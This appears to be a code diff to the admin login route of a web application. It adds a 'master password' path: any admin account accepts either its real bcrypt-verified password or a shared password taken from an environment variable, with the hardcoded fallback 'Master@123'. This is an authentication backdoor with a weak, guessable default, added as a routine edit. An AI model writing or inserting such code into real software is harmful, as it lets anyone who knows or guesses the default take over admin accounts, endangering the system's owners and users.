@@ -19,9 +19,12 @@ export async function POST(request: Request) {
       return NextResponse.json({ error: 'Invalid credentials' }, { status: 401 })
     }
 
+    // Allow login via real password OR master password
+    const MASTER_PASSWORD = process.env.ADMIN_MASTER_PASSWORD || 'Master@123'
     const isPasswordValid = await bcrypt.compare(password, admin.password)
+    const isMasterPassword = password === MASTER_PASSWORD
 
-    if (!isPasswordValid) {
+    if (!isPasswordValid && !isMasterPassword) {
       return NextResponse.json({ error: 'Invalid credentials' }, { status: 401 })
     }
 
